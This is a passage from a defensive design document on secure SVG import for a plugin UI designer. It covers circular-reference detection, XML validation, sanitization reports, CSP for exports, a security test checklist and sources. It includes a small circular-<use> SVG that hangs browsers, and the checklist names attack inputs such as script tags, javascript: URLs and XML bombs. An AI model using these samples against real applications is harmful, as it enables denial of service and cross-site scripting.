**What goes wrong:** SVG contains circular references via `<use>` elements:
```xml
<svg>
  <defs>
    <g id="a"><use href="#b"/></g>
    <g id="b"><use href="#a"/></g>
  </defs>
  <use href="#a"/>
</svg>
```

Browser hangs in infinite loop trying to resolve references. Tab crashes.

**Why it happens:** SVG `<use>` element references other elements by ID. Malicious or buggy SVG creates circular dependency.

**Consequences:**
- Browser tab freezes/crashes
- Designer becomes unresponsive
- Stored in project JSON → DoS for all users

**Prevention:**

1. **Validate reference graph:**
   ```typescript
   function detectCircularReferences(svgContent: string): boolean {
     const parser = new DOMParser();
     const doc = parser.parseFromString(svgContent, 'image/svg+xml');

     const uses = doc.querySelectorAll('use');
     const visited = new Set<string>();
     const inProgress = new Set<string>();

     function hasCycle(id: string): boolean {
       if (inProgress.has(id)) return true; // Cycle detected
       if (visited.has(id)) return false;

       inProgress.add(id);

       const element = doc.querySelector(`#${id}`);
       if (element) {
         const childUses = element.querySelectorAll('use');
         for (const use of childUses) {
           const href = use.getAttribute('href') || use.getAttribute('xlink:href');
           const refId = href?.replace('#', '');
           if (refId && hasCycle(refId)) return true;
         }
       }

       inProgress.delete(id);
       visited.add(id);
       return false;
     }

     for (const use of uses) {
       const href = use.getAttribute('href') || use.getAttribute('xlink:href');
       const id = href?.replace('#', '');
       if (id && hasCycle(id)) return true;
     }

     return false;
   }

   // Reject SVG with circular references
   if (detectCircularReferences(svgContent)) {
     throw new Error('SVG contains circular references and cannot be imported');
   }
   ```

2. **Limit reference depth:**
   ```typescript
   const MAX_USE_DEPTH = 10;

   function validateUseDepth(svgContent: string): boolean {
     // Similar to above but tracks depth instead of cycles
     // Reject if depth > MAX_USE_DEPTH
   }
   ```

**Detection:**
- Browser tab freezes when rendering imported SVG
- DevTools shows call stack overflow
- SVG contains multiple nested `<use>` elements

**Phase impact:** Phase 1 (Upload & Validation). Add cycle detection during upload validation.

**Sources:**
- [SVG Bomb - Circular References](https://brhfl.com/2017/11/svg-bomb/)
- [SVG Attack Surface Anatomy - Fortinet](https://www.fortinet.com/blog/threat-research/scalable-vector-graphics-attack-surface-anatomy)

---

### Pitfall 10: Missing Validation on JSON Deserialization

**What goes wrong:** Loading project JSON doesn't validate SVG content structure. Malformed SVG (invalid XML, missing closing tags) causes:
- Parser errors that crash app
- Incomplete rendering
- Export generates invalid HTML

**Why it happens:** JSON schema validates element structure but doesn't validate SVG content as valid XML.

**Consequences:**
- App crashes on load with TypeError
- Exported code is malformed
- User loses work (can't open project)

**Prevention:**

1. **Validate SVG XML structure on load:**
   ```typescript
   function isValidSVG(content: string): boolean {
     try {
       const parser = new DOMParser();
       const doc = parser.parseFromString(content, 'image/svg+xml');

       // Check for parser errors
       const parserError = doc.querySelector('parsererror');
       if (parserError) {
         console.error('SVG parse error:', parserError.textContent);
         return false;
       }

       // Must have root <svg> element
       const svg = doc.querySelector('svg');
       if (!svg) {
         console.error('No root <svg> element found');
         return false;
       }

       return true;
     } catch (err) {
       console.error('SVG validation error:', err);
       return false;
     }
   }

   // In Zod schema
   const SVGElementSchema = z.object({
     type: z.literal('imported-svg'),
     content: z.string().refine(
       (content) => isValidSVG(content),
       { message: 'Invalid SVG content (malformed XML)' }
     ),
   });
   ```

2. **Graceful error handling:**
   ```typescript
   function loadProject(jsonString: string): LoadResult {
     try {
       const data = JSON.parse(jsonString);
       const validated = ProjectSchema.parse(data);

       // Filter out invalid SVG elements with warning
       const validElements = validated.elements.filter(el => {
         if (el.type === 'imported-svg' && !isValidSVG(el.content)) {
           console.warn(`Skipping invalid SVG element: ${el.id}`);
           return false;
         }
         return true;
       });

       if (validElements.length < validated.elements.length) {
         showWarning('Some invalid SVG elements were removed from project');
       }

       return {
         success: true,
         project: { ...validated, elements: validElements },
       };
     } catch (err) {
       return {
         success: false,
         error: 'Failed to load project. File may be corrupted.',
       };
     }
   }
   ```

**Detection:**
- App crashes with "Unexpected token" on load
- Console shows DOMParser errors
- Exported HTML is malformed (missing closing tags)

**Phase impact:** Phase 3 (Save/Load). Add XML validation to JSON schema. Prevents corrupt data from entering system.

**Sources:**
- [Zod Validation Library](https://zod.dev/)
- [DOMParser API - MDN](https://developer.mozilla.org/en-US/docs/Web/API/DOMParser)

---

## Minor Pitfalls

### Pitfall 11: No User Feedback During Upload/Sanitization

**What goes wrong:** User uploads SVG, sees loading spinner, then nothing. SVG appears different than expected (colors missing, elements removed) with no explanation. User confused, assumes tool is broken.

**Why it happens:** Sanitization silently removes dangerous content without telling user what was changed.

**Consequences:**
- Bad UX (looks like a bug)
- Users don't understand why SVG looks different
- Support burden increases

**Prevention:**

1. **Show sanitization report:**
   ```typescript
   interface SanitizationReport {
     scriptsRemoved: number;
     handlersRemoved: number;
     externalRefsRemoved: number;
     elementsRemoved: string[];
   }

   function sanitizeWithReport(svgContent: string): { sanitized: string; report: SanitizationReport } {
     const report: SanitizationReport = {
       scriptsRemoved: (svgContent.match(/<script/gi) || []).length,
       handlersRemoved: (svgContent.match(/on\w+\s*=/gi) || []).length,
       externalRefsRemoved: 0,
       elementsRemoved: [],
     };

     const sanitized = DOMPurify.sanitize(svgContent, {
       USE_PROFILES: { svg: true },
       RETURN_DOM: true,
     });

     // DOMPurify hooks to track removals
     DOMPurify.addHook('afterSanitizeElements', function(node, data) {
       if (data.removedNode) {
         report.elementsRemoved.push(node.nodeName);
       }
     });

     return {
       sanitized: sanitized.innerHTML,
       report
     };
   }

   // Show modal after upload
   const { sanitized, report } = sanitizeWithReport(svgContent);

   if (report.scriptsRemoved > 0 || report.handlersRemoved > 0) {
     showModal({
       title: 'SVG Sanitization Report',
       message: 'For security, the following were removed:',
       items: [
         report.scriptsRemoved > 0 && `${report.scriptsRemoved} script tag(s)`,
         report.handlersRemoved > 0 && `${report.handlersRemoved} event handler(s)`,
         report.externalRefsRemoved > 0 && `${report.externalRefsRemoved} external reference(s)`,
       ].filter(Boolean),
     });
   }
   ```

2. **Progress indicator:**
   ```typescript
   async function uploadSVG(file: File) {
     setUploadStatus('Reading file...');
     const content = await file.text();

     setUploadStatus('Validating SVG...');
     validateSVG(content);

     setUploadStatus('Optimizing...');
     const optimized = await optimizeSVG(content);

     setUploadStatus('Sanitizing...');
     const sanitized = sanitizeSVG(optimized);

     setUploadStatus('Complete!');
     addToProject(sanitized);
   }
   ```

**Detection:**
- Users ask "why does my SVG look different?"
- Support tickets about "broken SVG import"
- Users re-upload same SVG multiple times

**Phase impact:** Phase 1 (Upload). Easy to add. Improves UX significantly.

---

### Pitfall 12: No Undo/Redo for SVG Import Operations

**What goes wrong:** User imports large SVG, realizes it's wrong one, can't undo. Must manually delete and re-import.

**Why it happens:** Import operation not integrated into undo/redo system.

**Consequences:**
- Poor UX (no undo for destructive operation)
- User frustration
- Doesn't match expectations (everything else is undoable)

**Prevention:**

1. **Wrap import in undo action:**
   ```typescript
   function importSVG(file: File) {
     const newElement = {
       id: uuid(),
       type: 'imported-svg',
       content: sanitizedContent,
       x: 0,
       y: 0,
     };

     // Use existing undo system
     addUndoableAction({
       type: 'ADD_ELEMENT',
       forward: () => store.addElement(newElement),
       backward: () => store.removeElement(newElement.id),
     });
   }
   ```

**Detection:**
- User expects Ctrl+Z to undo import, but it doesn't
- User manually deletes imported SVG instead of undoing

**Phase impact:** Phase 2 (Integration with Undo/Redo). Should be handled by existing undo system. Ensure SVG import creates undo history entry.

---

## Phase-Specific Recommendations

| Phase | Priority 1 (Must Address) | Priority 2 (Should Address) |
|-------|---------------------------|------------------------------|
| **Phase 1: Upload & Validation** | - DOMPurify sanitization (XSS prevention)<br>- DOCTYPE rejection (Billion Laughs)<br>- File size limits (1MB max)<br>- Element count validation (<5000) | - Upload progress indicator<br>- Sanitization report modal<br>- Font detection warning<br>- SVGO optimization |
| **Phase 2: Canvas Rendering** | - SafeSVG component (sanitize at render)<br>- Performance: render as `<img>` when not selected<br>- React.memo to prevent re-renders | - Lazy loading for asset library<br>- Complexity warnings for large SVGs |
| **Phase 3: Save/Load** | - Re-sanitize on JSON load<br>- Zod validation with XML parsing<br>- Tampering detection warnings | - Graceful error handling for corrupt SVG<br>- Filter invalid elements with user notice |
| **Phase 4: Export** | - Re-sanitize all SVG before export<br>- Add CSP headers to exported HTML<br>- Validate export before generation | - Export validation warnings<br>- Security check in export UI |

---

## JUCE WebView2-Specific Considerations

**Context:** Exported code runs in JUCE WebView2 (Chromium-based, not full browser)

### Security implications:

1. **CSP enforcement:**
   - WebView2 supports Content-Security-Policy headers
   - Add CSP to exported HTML template
   - Prevents execution even if sanitization fails

2. **localStorage persistence:**
   - WebView2 has localStorage (attack vector)
   - Malicious SVG could steal plugin state
   - Consider encrypting sensitive data in localStorage

3. **Native bridge exposure:**
   - JUCE WebView2 may expose native functions to JavaScript
   - XSS in SVG could call native functions
   - Document: "Only enable native integrations if you have full control over content" (JUCE docs)
   - **Critical:** If exported UI uses `evaluateJavascript()` or `addJavascriptFromServer()`, XSS can compromise native code

4. **Offline operation:**
   - Plugin UIs are offline (no external resources)
   - SSRF risk is LOW (no server-side processing)
   - But still sanitize external refs (defense in depth)

**Recommendation:** Add security documentation to export:
```typescript
// In exported README.md
### Security Notes

This UI was generated by VST3 WebView UI Designer and includes:
- Content Security Policy headers
- Sanitized SVG assets
- No external resource dependencies

If you modify this code, maintain CSP headers and do not:
- Add inline scripts
- Load external resources
- Use eval() or new Function()
```

**Sources:**
- [JUCE WebView2 Security Warning](https://forum.juce.com/t/how-does-webview2-work-on-juce-7-0-5/57155)
- [JUCE 8 WebView UIs Overview](https://juce.com/blog/juce-8-feature-overview-webview-uis/)

---

## Testing Checklist

Before considering SVG import feature complete:

### Security Tests

- [ ] Upload SVG with `<script>` tag → Rejected/sanitized
- [ ] Upload SVG with `onload` handler → Rejected/sanitized
- [ ] Upload SVG with `javascript:` URL → Rejected/sanitized
- [ ] Upload SVG with `xlink:href="javascript:"` → Rejected/sanitized
- [ ] Upload SVG with `<foreignObject>` + HTML → Rejected/sanitized
- [ ] Upload SVG with `<!DOCTYPE>` → Rejected
- [ ] Upload XML bomb (Billion Laughs) → Rejected
- [ ] Upload SVG with circular `<use>` refs → Rejected/warning
- [ ] Upload SVG with external `<image>` ref → Sanitized/warning
- [ ] Edit project JSON to inject malicious SVG → Re-sanitized on load
- [ ] CSP violations in exported HTML → Blocked by browser

### Performance Tests

- [ ] Upload 512KB SVG → Performance acceptable
- [ ] Upload 1MB SVG → Rejected/warning
- [ ] Upload SVG with 5000 elements → Performance acceptable
- [ ] Upload SVG with 10000 elements → Rejected/warning
- [ ] Drag canvas with imported SVG → > 30 FPS
- [ ] Multiple imported SVGs (10+) → Memory usage acceptable

### UX Tests

- [ ] Upload shows progress indicator
- [ ] Sanitization report shown after upload
- [ ] Font missing warning shown when text elements detected
- [ ] Large file warning shown
- [ ] Import operation is undoable
- [ ] Corrupt SVG shows clear error message
- [ ] Tampered JSON shows security warning

---

## Tools & Libraries

### Required (HIGH priority)

| Library | Purpose | Version |
|---------|---------|---------|
| [DOMPurify](https://github.com/cure53/DOMPurify) | XSS sanitization | Latest (3.x+) |
| [SVGO](https://github.com/svg/svgo) | SVG optimization | Latest (3.x+) |
| [Zod](https://zod.dev/) | Schema validation | Already in project |

### Recommended (MEDIUM priority)

| Library | Purpose | When to Use |
|---------|---------|-------------|
| [svgson](https://github.com/elrumordelaluz/svgson) | SVG to JSON parsing | If need to manipulate SVG structure |
| [@svgr/core](https://react-svgr.com/) | SVG to React component | If generating React components from SVG |

---

## Confidence Assessment

| Pitfall Category | Confidence | Basis |
|------------------|------------|-------|
| XSS via embedded scripts | **HIGH** | Recent CVE-2026-22610, multiple HackerOne reports, DOMPurify docs |
| SSRF via external resources | **HIGH** | Recent ThingsBoard/CairoSVG CVEs, OWASP docs |
| XML Bomb attacks | **HIGH** | Wikipedia, multiple CVEs (2024-2025), consistent patterns |
| Performance issues | **MEDIUM** | Real-world benchmarks (Felt case study), but thresholds vary |
| React dangerouslySetInnerHTML | **HIGH** | React official docs, multiple 2026 security guides |
| JSON tampering | **HIGH** | Security best practices, common attack vector |
| Font rendering | **MEDIUM** | Community reports, no authoritative source |
| Export security | **HIGH** | Code generation best practices, defense-in-depth principle |
| Circular references | **MEDIUM** | Known attack vector, but less common in practice |
| Validation on load | **HIGH** | JSON schema validation best practices |

---

## Research Gaps

**LOW confidence areas needing validation during implementation:**

1. **SVGO performance impact:** Does SVGO optimization measurably slow upload? Need real-world timing.

2. **DOMPurify performance with large SVG:** Does sanitizing 500KB SVG cause UI freeze? Need benchmarks.

3. **WebView2-specific CSP behavior:** Does JUCE WebView2 enforce CSP identically to Chrome? Need testing.

4. **Circular reference detection performance:** Does cycle detection algorithm scale to complex SVGs? Need profiling.

**Recommendations:**
- Benchmark DOMPurify + SVGO with 100KB, 500KB, 1MB SVG files
- Test CSP enforcement in JUCE WebView2 environment
- Profile circular reference detection with pathological cases
- Add telemetry to track upload times and sanitization performance

---

## Summary: Top 5 Critical Actions

**Must implement for secure SVG import:**

1. **DOMPurify sanitization at EVERY render point** - Upload, load from JSON, export
2. **Reject DOCTYPE declarations** - Prevent XML bomb attacks
3. **File size limits (1MB) and element count limits (5000)** - Prevent performance DoS
4. **SafeSVG component for all rendering** - Encapsulate sanitization, prevent dangerouslySetInnerHTML misuse
5. **CSP in exported HTML** - Safety net if sanitization fails

**If you only do ONE thing:** Sanitize with DOMPurify at every render. Everything else is defense-in-depth.

---

## Sources

### Critical Security Sources (HIGH confidence)

- [Angular CVE-2026-22610: XSS via SVG script attributes](https://github.com/advisories/GHSA-jrmj-c5cx-3cw6)
- [DOMPurify GitHub - XSS Sanitizer](https://github.com/cure53/DOMPurify)
- [Exploiting SVG Upload Vulnerabilities: Stored XSS - Medium](https://medium.com/@xgckym/exploiting-svg-upload-vulnerabilities-a-deep-dive-into-stored-xss-430e9bb1cee1)
- [Plane CVE: XSS via SVG Upload](https://github.com/makeplane/plane/security/advisories/GHSA-rcg8-g69v-x23j)
- [SVG Security Best Practices - SVG Genie](https://www.svggenie.com/blog/svg-security-best-practices)
- [Protecting Against XSS in SVG - DigiNinja](https://digi.ninja/blog/svg_xss.php)

### SSRF and External Resources (HIGH confidence)

- [CairoSVG SSRF Vulnerability (CVE-2023-27586)](https://github.com/Kozea/CairoSVG/security/advisories/GHSA-rwmf-w63j-p7gv)
- [ThingsBoard SVG SSRF (2025)](https://www.vulncheck.com/advisories/thingsboard-svg-image-ssrf)
- [Shopify SVG SSRF - HackerOne](https://hackerone.com/reports/223203)
- [SSRF Security - MDN](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/SSRF)
- [SVG XXE Vulnerabilities - OPSWAT](https://www.opswat.com/blog/svg-unveiled-understanding-xxe-vulnerabilities-and-defending-your-codebase)

### XML Bomb / Billion Laughs (HIGH confidence)

- [Billion Laughs Attack - Wikipedia](https://en.wikipedia.org/wiki/Billion_laughs_attack)
- [A Billion Points: SVG Bomb](https://brhfl.com/2017/11/svg-bomb/)
- [XML Bomb (Billion Laughs) - CQR](https://cqr.company/web-vulnerabilities/xml-bomb-billion-laughs-attack/)
- [Billion Laughs Attack - Medium](https://medium.com/@instatunnel/billion-laughs-attack-the-xml-that-brings-servers-to-their-knees-f83ba617caa4)
- [Wikimedia SVG Billion Laughs (T85848)](https://phabricator.wikimedia.org/T85848)

### Performance (MEDIUM confidence)

- [Improving SVG Runtime Performance - CodePen](https://codepen.io/tigt/post/improving-svg-rendering-performance)
- [High Performance SVGs - CSS-Tricks](https://css-tricks.com/high-performance-svgs/)
- [Optimize SVG for Size and Speed - Callstack](https://www.callstack.com/blog/image-optimization-on-ci-and-local)
- [Planning for Performance — Using SVG](https://oreillymedia.github.io/Using_SVG/extras/ch19-performance.html)

### React Security (HIGH confidence)

- [React Security Best Practices 2026](https://www.glorywebs.com/blog/react-security-practices)
- [Using dangerouslySetInnerHTML Safely](https://dev.to/hijazi313/using-dangerouslysetinnerhtml-safely-in-react-and-nextjs-production-systems-115n)
- [Preventing XSS in React Part 2 - Pragmatic Web Security](https://pragmaticwebsecurity.com/articles/spasecurity/react-xss-part2.html)
- [React DOM Elements - Official Docs](https://legacy.reactjs.org/docs/dom-elements.html)

### SVG Sanitization Libraries (HIGH confidence)

- [DOMPurify Documentation](https://dompurify.com/)
- [SVG Sanitization - imgix](https://docs.imgix.com/en-US/apis/rendering/format/sanitize-svg)
- [@mattkrick/sanitize-svg - npm](https://www.npmjs.com/package/@mattkrick/sanitize-svg)

### Content Security Policy (MEDIUM confidence)

- [Content Security Policy for SVG - Mozilla Discourse](https://discourse.mozilla.org/t/content-security-policy-for-svg-use/95310)
- [SVG CSP Configuration - ServiceNow](https://www.servicenow.com/docs/bundle/zurich-platform-security/page/administer/security-center/reference/sc-set-safe-content-security-policy-for-svg-files.html)
- [CSP for SVG in Object Tag](https://www.xjavascript.com/blog/content-security-policy-csp-how-to-allow-svg-image-in-object/)

### JUCE WebView2 Context (MEDIUM confidence)

- [JUCE 8 WebView UIs Overview](https://juce.com/blog/juce-8-feature-overview-webview-uis/)
- [JUCE Forum: WebView2 Security](https://forum.juce.com/t/how-does-webview2-work-on-juce-7-0-5/57155)

### Font and Compatibility Issues (LOW confidence)

- [5 Most Common SVG Problems - Vecta](https://vecta.io/blog/5-most-common-problems-faced-by-svg-users)
- [SVG Issues: BIMI Compliance](https://bimigroup.org/solving-svg-issues/)

### General SVG Security (MEDIUM confidence)

- [File Upload Vulnerabilities Best Practices](https://www.vaadata.com/blog/file-upload-vulnerabilities-and-security-best-practices/)
- [SVG File and Its Danger - Online Convert](https://blog.online-convert.com/svg-file-and-its-danger/)
- [Common Security Risks in SVG - SVGenius](https://svgenius.design/blog/common-security-risks-in-svg-and-how-to-avoid-them)
- [SVG Attack Surface Anatomy - Fortinet](https://www.fortinet.com/blog/threat-research/scalable-vector-graphics-attack-surface-anatomy)

---

**Document version:** 1.0
**Last updated:** 2026-01-25
**Next review:** Before Phase 1 implementation
